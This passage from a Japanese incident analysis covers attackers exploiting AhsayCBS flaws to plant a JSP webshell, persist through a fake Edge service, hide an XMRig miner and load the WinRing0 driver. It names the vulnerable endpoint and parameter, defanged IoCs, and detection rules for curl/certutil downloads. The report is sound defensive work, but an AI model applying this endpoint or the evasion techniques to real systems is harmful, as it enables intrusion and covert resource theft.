MSP・システムイ</text><text x="295.0" y="337.0" text-anchor="middle" fill="#64b5f6" font-size="10">ンテグレータが運用</text><rect x="424" y="133.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="499.0" y="155.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">悪性の replicat</text><text x="499.0" y="169.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ion receiver</text><text x="499.0" y="183.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5"> の設定</text><rect x="424" y="211.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="499.0" y="233.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">JSP ウェブシェル（C</text><text x="499.0" y="247.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">BS が配信するディレク</text><text x="499.0" y="261.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">トリ）</text><text x="499.0" y="274.0" text-anchor="middle" fill="#f48fb1" font-size="10">コマンドはサービスの子プ</text><text x="499.0" y="286.0" text-anchor="middle" fill="#f48fb1" font-size="10">ロセスとして現れる</text><rect x="628" y="121.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="703.0" y="143.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">Alibaba Clou</text><text x="703.0" y="157.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">d オブジェクトストレー</text><text x="703.0" y="171.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ジ（imagefile…</text><text x="703.0" y="184.0" text-anchor="middle" fill="#64b5f6" font-size="10">平文HTTP／curl・</text><text x="703.0" y="196.0" text-anchor="middle" fill="#64b5f6" font-size="10">certutil で取得</text><rect x="628" y="223.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="703.0" y="245.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">Taskgmr.ps1／</text><text x="703.0" y="259.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">msedge.exe（改</text><text x="703.0" y="273.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">変NSSM）／edge…</text><text x="703.0" y="286.0" text-anchor="middle" fill="#ffcc80" font-size="10">置き場所は %TEMP%</text><text x="703.0" y="298.0" text-anchor="middle" fill="#ffcc80" font-size="10">・AppData\Loc</text><rect x="832" y="88.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="907.0" y="110.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">Windows サービス</text><text x="907.0" y="124.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5"> MicrosoftEd</text><text x="907.0" y="138.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">geUpdateSvc…</text><rect x="832" y="166.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="907.0" y="188.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">Taskgmr.ps1：</text><text x="907.0" y="202.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">タスクマネージャーを監視</text><text x="907.0" y="216.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">して採掘を隠す／18:…</text><text x="907.0" y="229.0" text-anchor="middle" fill="#f48fb1" font-size="10">AI の助けを借りて書か</text><text x="907.0" y="241.0" text-anchor="middle" fill="#f48fb1" font-size="10">れたとみられる（Hunt</text><rect x="832" y="268.0" width="150" height="76" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="907.0" y="290.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">WinRing0x64.</text><text x="907.0" y="304.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">sys（正規だが脆弱なカ</text><text x="907.0" y="318.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">ーネルドライバ）</text><text x="907.0" y="331.0" text-anchor="middle" fill="#f48fb1" font-size="10">署名の検査では止まらない</text><rect x="1036" y="16.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#ffcc80" stroke-width="1.4"/><text x="1111.0" y="38.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">XMRig による Mo</text><text x="1111.0" y="52.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">nero の採掘（51.</text><text x="1111.0" y="66.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">195.127[.]1…</text><rect x="1036" y="94.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="1111.0" y="116.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">侵害されたのはバックアッ</text><text x="1111.0" y="130.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">プの管理基盤——復旧の最</text><text x="1111.0" y="144.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">後の拠り所</text><text x="1111.0" y="157.0" text-anchor="middle" fill="#64b5f6" font-size="10">痕跡があれば信頼できるバ</text><text x="1111.0" y="169.0" text-anchor="middle" fill="#64b5f6" font-size="10">ックアップから完全再構築</text><rect x="1036" y="196.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#80cbc4" stroke-width="1.4"/><text x="1111.0" y="218.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">被害組織（数・名称・業種</text><text x="1111.0" y="232.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">・国はいずれも公表されて</text><text x="1111.0" y="246.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">いない）</text><rect x="1036" y="274.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#80cbc4" stroke-width="1.4"/><text x="1111.0" y="296.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">Huntress（観測・</text><text x="1111.0" y="310.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">公開・Sigma ルール</text><text x="1111.0" y="324.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">4本・Ahsay へ連…</text><rect x="1036" y="352.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#80cbc4" stroke-width="1.4"/><text x="1111.0" y="374.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">Ahsay（開発元。ad</text><text x="1111.0" y="388.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">visory ページに本</text><text x="1111.0" y="402.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">件の告知は確認できず／…</text></svg></div><div class=fn>layer 0 は攻撃者（帰属への言及は無い）。 layer 1 が入口——**インターネットに露出した AhsayCBS の管理用インターフェース**で、 CVE-2026-105133（認証の不備）→ CVE-2026-105134（未認証RCE）の連鎖により **NT AUTHORITY\SYSTEM としてコードが実行された**（観測開始は2026年10月7日 23:20:15 UTC）。 layer 2 は足場——**悪性の replication receiver の設定**と **CBS アプリが配信するディレクトリへの JSP ウェブシェルの設置**。 layer 3 は配送——**Alibaba Cloud のオブジェクトストレージ**から `Taskgmr.ps1`・`msedge.exe`・`edge.exe`・`config.json` を一時フォルダへ取得（curl・certutil）。 layer 4 は常駐と隠蔽——**`MicrosoftEdgeUpdateSvc`（本物の `edgeupdate` に似せた名前）**が 改変 NSSM（`msedge.exe`）を SYSTEM 権限で動かし、 `Taskgmr.ps1` が**タスクマネージャーを監視して採掘を隠し**、 **脆弱な正規ドライバ `WinRing0x64.sys`**がハードウェアへのカーネル水準の到達を与える。 layer 5 が結果——**XMRig による採掘（ポート 8029・xmr.kryptex[.]network）**と、 **バックアップの管理基盤が侵害されたという事実そのもの。** 右端は対処——Huntress の Sigma ルール4本と、 **「修正が出るまで管理画面への到達を制限し、 痕跡が見つかれば信頼できるバックアップから完全に再構築する」という勧告である。** **図の要点は3つ。** ①**正規のものばかりで組み立てられている**—— curl・certutil・NSSM・WinRing0・Alibaba Cloud・Microsoft Edge の名前。 悪性と判定しにくいものを並べて、全体として悪性の挙動を作っている。 ②**隠蔽が「人の目」を相手にしている**——タスクマネージャーを見張る仕掛けは、 自動の検知ではなく利用者の気づきを封じるためのものである。 ③**最後の防壁が侵害されている**—— 「信頼できるバックアップから再構築せよ」という勧告の対象が、 バックアップの管理基盤そのものである。</div></div></div>
+<div class="blk " id="s14"><h3>どこで止められたか</h3><div class="blknote">段階ごとに検知の機会があったか、どの対策があれば効きえたかを整理したものです。「効きえた対策」は本記録の評価であり、当事者が述べたものではありません。</div><div class=twrap><table class=g><thead><tr><th>段階</th><th>検知の機会</th><th>効きえた対策</th></tr></thead><tbody><tr><td class=nowrap><span class="b stage">初期侵入</span></td><td><span class="b do">検知した</span><div class=sm>**Huntress は AhsayCBS の実行ファイル（`cbssvcX64.exe`）から生まれた 不審なコマンド行で最初に気づいている。** **検知点は脆弱性の悪用そのものではなく、その結果である**（本記録の評価）—— 「このサービスは普段どんな子プロセスを作るか」を知っていたから異常と分かった</div></td><td><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　**Huntress が勧告している緩和策である。** 「攻撃はホスト上で外部から到達できる Web アプリのサービスを狙うため」と 理由も述べられている（原文英語）。 **修正版が無い状態では、これが唯一の予防である**（本記録の評価）</span></div><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断。**管理コンソールの露出は、本件に限らず繰り返されている形である**</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　**Huntress の Sigma ルール1本目がこれである**—— 「AhsayCBS は Web アプリをサービスのプロセス内で動かすため、 設置された JSP のウェブシェルからのコマンドは サービスの直接の子プロセスとして現れる」（原文英語）</span></div></td></tr><tr><td class=nowrap><span class="b stage">永続化</span></td><td><span class="b do">検知した</span><div class=sm>**ウェブシェル経由のコマンドは、サービスの子プロセスとして現れる**（Huntress）。 **ファイルの設置そのものを検知した記述は無い**（本記録の確認）</div></td><td><div class=ctl><span class="b eff">検知できた</span><span class=sm>　本記録の判断。**JSP の1ファイルの追加が裏口になる。** 配信ディレクトリは変更の頻度が低く、監視の誤報が少ない</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　本記録の判断。**本件では設定機能そのものが攻撃の道具として使われている**</span></div></td></tr><tr><td class=nowrap><span class="b stage">C2通信</span></td><td><span class="b do">検知した</span><div class=sm>**コマンド行がサービスの子プロセスとして観測されている。** **また取得が平文の HTTP である**（本記録の指摘）—— 出口の通信を見ていれば、宛先と取得されたファイル名が記録に残る</div></td><td><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断。**バックアップの管理サーバが 外部のオブジェクトストレージへ自発的に取りに行く必要は通常ない**</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　本記録の判断。**本件は curl と certutil の両方が使われている**—— いずれも OS に同梱された正規の道具である</span></div></td></tr><tr><td class=nowrap><span class="b stage">権限昇格</span></td><td><span class="b do">検知した</span><div class=sm>**Huntress の Sigma ルール2本目が、Edge を名乗る実行ファイルを狙っている**—— 「元のファイル名が `msedge_exe` であるもの、または `--daemonized` 付きで 動くものを検知する」（原文英語）。 **一時フォルダから SYSTEM で動くサービスの作成そのものも強い信号である**（本記録の評価）</div></td><td><div class=ctl><span class="b eff">検知できた</span><span class=sm>　本記録の判断。**正規のソフトウェアが一時フォルダから常駐することはほぼ無い。** **置き場所だけで判定できるため、名前の偽装に強い**</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　本記録の判断。**本件のサービス名は本物に似せてある**—— 名前での判定ではなく「増えたこと」で見る</span></div><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断</span></div></td></tr><tr><td class=nowrap><span class="b stage">検知回避</span></td><td><span class="b do">検知した</span><div class=sm>**Huntress の Sigma ルール3本目と4本目がこの段を狙っている**—— 3本目は「タスクマネージャーの有無を調べてサービスを止めたり動かしたりする スクリプトブロック」を検知する。 **サービス名ではなくその組み合わせで照合するため、 サービスを改名しても回避できない**（原文英語）。 4本目は「`WinRing0` の名前と URL が同じコマンド行に現れること」を検知する—— **正規のハードウェア監視ツールはインストーラの中に同梱して配るため、 コマンド行で取得する形は異常である**（原文英語）</div></td><td><div class=ctl><span class="b eff">侵入を防げた</span><span class=sm>　本記録の判断。**WinRing0 は以前から他の無関係な攻撃でも使われている** （Huntress もそう述べている）。 **「正規に署名された脆弱なドライバ」は署名の検査では止まらない**</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　本記録の判断。**本件の隠蔽はスクリプトで実現されている**—— ログが無ければ中身は追えない</span></div><div class=ctl><span class="b eff">検知できた</span><span class=sm>　本記録の判断。**本件のスクリプトは18:00にタスクマネージャーを終了させる。** **利用者から見れば「落ちる」症状であり、申告されれば手がかりになる**</span></div></td></tr><tr><td class=nowrap><span class="b stage">影響（暗号化・破壊・改ざん）</span></td><td><span class="b do">検知した</span><div class=sm>**採掘は CPU の消費として現れるため、性能の劣化で気づける可能性がある**（本記録の評価）。 **だからこそ攻撃者はタスクマネージャーを隠す仕掛けを入れている**—— **隠蔽の存在そのものが「利用者が気づける水準だった」ことの裏返しである**</div></td><td><div class=ctl><span class="b eff">検知できた</span><span class=sm>　本記録の判断</span></div><div class=ctl><span class="b eff">影響を限定できた</span><span class=sm>　本記録の判断。**ただし宛先の遮断は回避されやすい**—— 既定拒否の出口制御のほうが確実である</span></div><div class=ctl><span class="b eff">復旧を早められた</span><span class=sm>　**Huntress の勧告である。** 理由として 「攻撃者は長期の常駐のために二次的な裏口を隠せている」ことを挙げている。 **バックアップの管理基盤そのものが侵害されている事案で 「信頼できるバックアップ」を要求される点は重い**（本記録の指摘）</span></div></td></tr></tbody></table></div></div>
+<div class="blk " id="s15"><h3>対応の評価</h3><div class="blknote">評価材料がない判断は「評価材料なし」としています。結果論で断じないための区分です。</div><div class="absent">対応の巧拙を評価できる材料が公表資料から得られていません。</div></div>
+<div id="s16"><div class=less><div class=lesst>CISO・経営層への示唆</div><ul><li><div class=lp>バックアップの管理基盤を「守る対象」の最上位に置き直す</div><div class=lw>侵害されたのは **AhsayCBS（Cloud Backup Server）の管理コンソール**である。 バックアップの運用を集中管理し、利用者の作成や方針の設定を行う基盤であり、 **ランサムウェアに対する最後の拠り所でもある。** 本件では採掘で終わっているが、 Huntress は「二次的な裏口を隠せている」として **信頼できるバックアップからの完全な再構築**を勧めている—— **バックアップの基盤が侵害されている事案で、この要求は重い**（本記録の評価）</div><div class=la><b>取るべき行動</b> バックアップの管理基盤（管理コンソール・保管先・復旧の手順書）について、 **①インターネットから直接到達できるか、 ②管理の認証は業務系と分離されているか、 ③基盤そのものが侵害された場合の復旧手順があるか**を確かめる。 ③が無ければ作る——**「バックアップから戻す」計画は、 バックアップの基盤が健全であることを前提にしている。** あわせて**復旧の演習に「管理基盤が信用できない」場面を1つ入れる**</div></li><li><div class=lp>「修正版が無い」期間の判断を、事前に決めた手順として持つ</div><div class=lw>Huntress は**10.3.4 も影響を受ける**と訂正し、 **「修正が入手できるようになるまでは管理用インターフェースへの アクセスを制限し、侵害の痕跡を調査すること」**を推奨している（原文英語）。 一方、**CVE の記載（VulDB・INCIBE-CERT）は解決策を 「10.3.4 へのアップグレード」としている**—— **同じ日に見比べると、運用の判断が逆になる**（本記録の指摘）</div><div class=la><b>取るべき行動</b> 脆弱性の対応の手順に、**「修正が無い／情報が食い違う」場合の分岐**を書いておく—— ①**到達の制限**（公開の停止・IP 制限・VPN 越しに限る）を先に決める、 ②**供給元の告知と、観測している第三者（EDR・MDR の事業者）の記述の どちらを優先するかを決める**、 ③**判断を下した日時と根拠を記録に残す**（後で覆るため）。 **本件では、観測している側（Huntress）の情報が CVE の記載より新しく、かつ運用に厳しい方向だった**</div></li><li><div class=lp>MSP・システムインテグレータに運用を委ねている部分の「管理基盤の露出」を確認する</div><div class=lw>Huntress は AhsayCBS を**主に MSP とシステムインテグレータが使う**ものと説明している。 **1つの管理コンソールの背後に多数の顧客環境がある構図である**（本記録の読み）。 **被害組織の数・名称は公表されていない**ため、 自社が委託先経由で影響を受けているかを外から知る手立ては無い</div><div class=la><b>取るべき行動</b> バックアップ・監視・運用を委託している先に対し、 **①自社のデータを扱う管理基盤の製品名と版、 ②その管理画面がインターネットに露出していないか、 ③脆弱性の情報を受け取ったときの通知の約束（何時間以内に何を伝えるか）**を照会する。 **「対策済みです」という回答だけでは足りない**—— **本件は修正版が無い状態の事案であり、 「適用済み」という答えが成立しない局面がある**（本記録の指摘）</div></li><li><div class=lp>採掘で終わった事案を「軽い」と評価しない</div><div class=lw>本件の実被害は**計算資源の横取り**である。 しかし使われた入口は**未認証で SYSTEM 権限のコード実行**であり、 **同じ入口でランサムウェアも情報の持ち出しも成立する**（本記録の評価）。 攻撃者は JSP のウェブシェル、改変した NSSM による常駐、 脆弱なドライバの持ち込みまで組み立てている—— **採掘は目的だが、能力はそれ以上である**</div><div class=la><b>取るべき行動</b> 自社の脆弱性の優先度付けで、**「観測されている悪用の目的」ではなく 「取られる権限」で重みを決める。** 未認証で SYSTEM・root を取られるものは、 **観測が採掘であっても最優先に置く。** あわせて、**過去に採掘機を見つけて除去しただけで閉じた事案**があれば、 同じホストに裏口が残っていないかを改めて確かめる</div></li></ul></div></div>
+<div id="s17"><div class=less><div class=lesst>セキュリティ技術者への示唆</div><ul><li><div class=lp>管理サービスのプロセスから生まれる子プロセスを、既知の正常な一覧で絞って検知する</div><div class=lw>Huntress が最初に気づいたのは、 **AhsayCBS のサービス実行ファイル（`cbssvcX64.exe`）から生まれた 不審なコマンド行**である。 「AhsayCBS は Web アプリをサービスのプロセス内で動かすため、 設置された JSP のウェブシェルからのコマンドは サービスの直接の子プロセスとして現れる」（原文英語）</div><div class=la><b>取るべき行動</b> 自社の公開サービス（アプリサーバ・バックアップ基盤・監視基盤）について、 **「このプロセスが普段作る子プロセスの一覧」を実測で作る** （平常時の1〜2週間の記録から）。 それ以外が生まれたら検知する。 **とくに `cmd.exe`・`powershell.exe`・`curl`・`certutil` が サービスの子として現れる形は、ウェブシェルの典型である**（本記録の評価）</div></li><li><div class=lp>一時フォルダから常駐するサービスを、名前ではなく「置き場所」で検知する</div><div class=lw>攻撃者は `MicrosoftEdgeUpdateSvc` という **本物の Edge 更新サービス（`edgeupdate`）に似せた名前**のサービスを作り、 一時フォルダの `msedge.exe`（**改変された NSSM**）を **SYSTEM 権限で**動かした。採掘機は `edge.exe` で、こちらも Edge を装っている。 **名前で判定しようとすると、改名で回避される**（本記録の評価）</div><div class=la><b>取るべき行動</b> 検知ルールを**①実行ファイルの置き場所が `%TEMP%`・`AppData\Local\Temp`・`ProgramData` の直下であるサービスの作成、 ②SYSTEM 権限で動くサービスの新規作成、 ③サービスの一覧の日次の差分**で書く。 **Huntress の Sigma ルールの発想を借りれば、 「元のファイル名が `msedge_exe`」や「`--daemonized` 付き」といった 中身の属性で照合するのも有効である**—— **名前は変えられるが、改変元の実行ファイルの属性は残る**</div></li><li><div class=lp>脆弱な正規ドライバの読み込みを、署名ではなく遮断リストで止める</div><div class=lw>一部の事案では、`certutil.exe` で **`WinRing0x64.sys`**が持ち込まれた。 これは OpenLibSys の WinRing0 ライブラリの一部で、 **正規だが脆弱なカーネルドライバ**である。 **署名は有効であり、署名の検査では止まらない**（本記録の指摘）。 本件では防御の無効化ではなく、 **採掘機にハードウェアへのカーネル水準の到達を与えるために使われた**（Huntress の評価）</div><div class=la><b>取るべき行動</b> Windows の**脆弱ドライバ遮断リスト（HVCI／WDAC のブロックリスト）を有効にする。** そのうえで、**`WinRing0` の名前と URL が同じコマンド行に現れること**を検知する （Huntress の Sigma ルール4本目。 「正規のハードウェア監視ツールはインストーラの中に同梱して配るため、 コマンド行で取得する形は異常である」）。 **あわせて `certutil.exe` による外部からのファイル取得を検知対象に入れる**</div></li><li><div class=lp>採掘機の隠蔽の仕掛けを逆手に取る——「利用者が気づける症状」を申告の経路に乗せる</div><div class=lw>`Taskgmr.ps1` は**タスクマネージャーが開かれたらサービスを止め、 閉じられたら再開する。** さらに**18:00 にタスクマネージャーを終了させ、 夜間に1時間以上開かれていた場合にも終了させる。** **隠蔽の仕掛けがあること自体が、利用者が気づける水準の負荷だったことを示す** （本記録の評価）。時刻の判定は**ローカル時刻**で行われている</div><div class=la><b>取るべき行動</b> **「タスクマネージャーが勝手に閉じる」「動作が重い」といった 利用者の体感を、申告の経路として受け付ける**（窓口と文面を用意する）。 技術側では**PowerShell のスクリプトブロックのログを有効化**し、 **プロセスの列挙とサービスの start/stop を組み合わせる挙動**を検知する。 **サービス名での照合は避ける**（改名で回避されるため）</div></li><li><div class=lp>サーバからの出口の通信を既定で拒否する——配送も採掘も出口を通る</div><div class=lw>攻撃者は**Alibaba Cloud のオブジェクトストレージ** （`imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com`）から 平文の HTTP で4つのファイルを取得し、 採掘機は**ポート 8029** で Monero のプールへ接続した。 **どちらもサーバからの外向きの通信である**（本記録の評価）。 **正規のクラウドストレージを配送に使うのは、宛先の評判で遮断されにくくするためである**</div><div class=la><b>取るべき行動</b> サーバ（とくに公開サービスを動かすホスト）からの**出口の通信を既定で拒否**し、 業務に必要な宛先・ポートだけを許可する。 **バックアップの管理サーバが外部のオブジェクトストレージへ 自発的に取りに行く必要は通常ない**（本記録の判断）。 既定拒否にできない場合は、**非標準ポートへの外向きの接続**と **サーバからの新規の宛先への HTTP** を検知する</div></li></ul></div></div>
+<div class="blk " id="s18"><h3>自組織に当てはまるか</h3><div class="blknote">該当する項目があれば、この事案と同じ構図が自組織でも成立しうることを意味します。</div><div class=twrap><table class=g><thead><tr><th>観点</th><th>自社に当てはまるか</th><th>該当する場合に何が起きうるか</th></tr></thead><tbody><tr><td class=nowrap><span class="b axis">システム構成</span></td><td><span class=chk>□</span> バックアップ・監視・運用の管理コンソール（AhsayCBS に限らず）が インターネットから直接到達できる場所に置かれている</td><td class=sm>本件の攻撃は**ホスト上で外部から到達できる Web アプリのサービス**を狙っており、 Huntress の緩和策は「管理用インターフェースへの到達を 信頼できる IP か VPN に限る」ことである</td></tr><tr><td class=nowrap><span class="b axis">委託・第三者部品</span></td><td><span class=chk>□</span> 自社のバックアップを MSP・システムインテグレータに委ね、 その管理基盤の製品名・版・露出の状態を把握していない</td><td class=sm>AhsayCBS は**主に MSP とシステムインテグレータが使う**ものであり、 1つの管理コンソールの背後に多数の顧客環境がある。 **被害組織は公表されていない**ため、外から知る手立てが無い</td></tr><tr><td class=nowrap><span class="b axis">運用・監視</span></td><td><span class=chk>□</span> 公開サービスのプロセスから生まれる子プロセスを検知していない （「このサービスが普段作る子プロセスの一覧」を持っていない）</td><td class=sm>本件の最初の手がかりは **`cbssvcX64.exe` から生まれた不審なコマンド行**だった。 ウェブシェルからのコマンドはサービスの直接の子として現れる</td></tr><tr><td class=nowrap><span class="b axis">運用・監視</span></td><td><span class=chk>□</span> Windows の脆弱ドライバ遮断リスト（HVCI／WDAC）を有効にしておらず、 正規に署名された脆弱なドライバの読み込みを止められない</td><td class=sm>本件では `certutil.exe` で **`WinRing0x64.sys`**が持ち込まれた。 **署名は有効であり、署名の検査では止まらない**</td></tr><tr><td class=nowrap><span class="b axis">運用・監視</span></td><td><span class=chk>□</span> サーバからの出口の通信が既定で許可になっており、 非標準ポートへの外向きの接続を検知していない</td><td class=sm>配送は Alibaba Cloud のオブジェクトストレージから平文の HTTP、 採掘は**ポート 8029**での接続である。どちらも外向きの通信である</td></tr><tr><td class=nowrap><span class="b axis">体制・契約</span></td><td><span class=chk>□</span> 脆弱性の対応手順に「修正版が無い」「供給元の告知と第三者の観測が食い違う」場合の 分岐が書かれていない</td><td class=sm>**Huntress は 10.3.4 も影響を受けると訂正し「修正が出るまで到達を制限せよ」と述べ、 CVE の記載は「10.3.4 へ上げよ」としている**——判断が逆になる</td></tr></tbody></table></div></div>
+<div class="blk " id="s19"><h3>出典</h3><div class=rg><div class=rgt>当事者の公表</div><ol><li><span class=rid>[4]</span> <span class=sm>2019年4月24日（本件に関する告知は無い） Ahsay</span> <a href="https://www.ahsay.com/en/company/announcements/ahsay-security-advisory" target="_blank" rel="noreferrer noopener nofollow">Ahsay Security Advisory</a> <span class="b kind">注意喚起・勧告</span><span class=sm>（(本記録の作成者が**2026年10月9日に確認した観測の記録**。 **CVE-2026-105133／CVE-2026-105134 に関する告知は掲載されていなかった。** 掲載されていたのは**2019年4月24日の「Critical Vulnerabilities on v7 and v8」1件のみ**で、 内容は AhsayCBS v7・v8 の全バージョンに影響する クロスサイトスクリプティングと XML 外部エンティティの脆弱性である。 **したがって本記録には供給元の公式の認定が存在しない**—— 影響範囲（10.3.4 を含むか）・修正版の提供時期はいずれも確認できていない。 **出典2が参照先として v10.3.4 のリリースノートを挙げているため、 リリースノートには何らかの記述がある可能性があるが、本記録は未確認である**)）</span></li></ol></div><div class=rg><div class=rgt>政府・監督官庁</div><ol><li><span class=rid>[2]</span> <span class=sm>2026年10月4日（最終更新 2026年10月6日） INCIBE-CERT（スペイン国立サイバーセキュリティ研究所）</span> <a href="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2026-105134" target="_blank" rel="noreferrer noopener nofollow">CVE-2026-105134</a> <span class="b kind">脆弱性情報（JVN/CVE等）</span><span class=sm>（(本記録の作成者が2026年10月9日に取得。 **影響を受けるのは AhsayCBS 10.3.2 以前**、 **Replication Receiver の `/rps/api/json/UpdateReceivers.do` の `random` 引数の操作による OS コマンドインジェクション（CWE-77）**、 **リモートから攻撃可能**、 **CVSS v4.0 9.30（E:P＝実証コードが存在する）／v3.1 10.00／v2.0 10.00**、 **解決策は 10.3.4 へのアップグレード**、 参照先に VulDB（提出番号 942743・脆弱性番号 413351）と **Ahsay の v10.3.4 のリリースノート**が挙げられていることの出典。 **Huntress の訂正（10.3.4 も影響を受ける）とは食い違う**—— 本記録は discrepancies に記録した)）</span></li><li><span class=rid>[3]</span> <span class=sm>2026年10月4日（最終更新 2026年10月6日） INCIBE-CERT（スペイン国立サイバーセキュリティ研究所）</span> <a href="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2026-105133" target="_blank" rel="noreferrer noopener nofollow">CVE-2026-105133</a> <span class="b kind">脆弱性情報（JVN/CVE等）</span><span class=sm>（(本記録の作成者が2026年10月9日に取得。 **影響を受けるのは AhsayCBS 10.3.2 以前**、 **認証の不備（CWE-287）**、 **CVSS v4.0 5.50（MEDIUM）／v3.1 7.30／v2.0 7.50**、 **10.3.4 へのアップグレードで問題を軽減できるとされていること**の出典。 Huntress は本件を「medium-severity」とし、**連鎖の1段目**に位置づけている)）</span></li></ol></div><div class=rg><div class=rgt>ベンダー分析</div><ol><li><span class=rid>[1]</span> <span class=sm>2026年10月8日 20:00 UTC（同日18:00 米国東部時間に訂正の追記） Huntress</span> <a href="https://www.huntress.com/blog/ahsaycbs-flaws-exploit" target="_blank" rel="noreferrer noopener nofollow">Threat Actors Exploit Critical AhsayCBS Flaws to Drop Webshells and XMRig Cryptominer</a> <span class="b kind">ブログ</span><span class=sm>（(本記録の起点かつ中核の資料。保存分 output/articles/20261009/ 0204_huntress-blog_threat-actors-exploit-critical-ahsaycbs-flaws-to-d.md で読んだ。 **一次資料の題名は訳さない。** **2つの脆弱性（CVE-2026-105133 の `checkSysPwd` 関数の認証の不備、 CVE-2026-105134 の `/rps/api/json/UpdateReceivers.do` に対する NT AUTHORITY/SYSTEM での未認証リモートコード実行）とその連鎖**、 **実地での悪用の観測の開始（2026-10-07 23:20:15 UTC）**、 **`cbssvcX64.exe` から生まれた不審なコマンド行による検知**、 **悪性の replication receiver の設定と JSP ウェブシェルの設置**、 **Alibaba Cloud のオブジェクトストレージからの `Taskgmr.ps1`・`msedge.exe`・ `edge.exe`・`config.json` の取得（curl のコマンド行を掲載）**、 **XMRig による採掘（`edge.exe`・ポート 8029・`51.195.127[.]124:8029`・ `xmr.kryptex[.]network`）**、 **`MicrosoftEdgeUpdateSvc` による SYSTEM 権限での常駐と、 `msedge.exe` が改変された NSSM であること**、 **`Taskgmr.ps1` の隠蔽の挙動（タスクマネージャーの監視・18:00 の終了・ 夜間に1時間以上開かれた場合の終了・ローカル時刻の使用）と AI の助けを借りて書かれたとみられるという評価**、 **`certutil.exe` による `WinRing0x64.sys` の持ち込みと、 その用途が防御の無効化ではなく採掘のためのハードウェアへの カーネル水準の到達であったという評価**、 **緩和策（管理用インターフェースへの到達を信頼できる IP か VPN に限る／ IoC が見つかれば信頼できるバックアップから完全に再構築する／ 攻撃者が二次的な裏口を隠せていること）**、 **Sigma ルール4本（`2026/2026-10/AhsayCBS_XMRig_Miner`）とその設計の理由**、 **ATT&amp;CK の対応表**、 そして**2026年10月8日18時（米国東部時間）の訂正 （10.3.4 も影響を受ける／以前の報告を改めた／Ahsay に連絡した／ 修正が入手できるまでは到達の制限と痕跡の調査を推奨）**の出典。 **被害組織の数・名称・業種・国は記載されていない。** **帰属への言及も無い。** **IoC 表の SHA256 の値は、本記録が読んだ保存分では欠落していた**)）</span></li></ol></div></div>
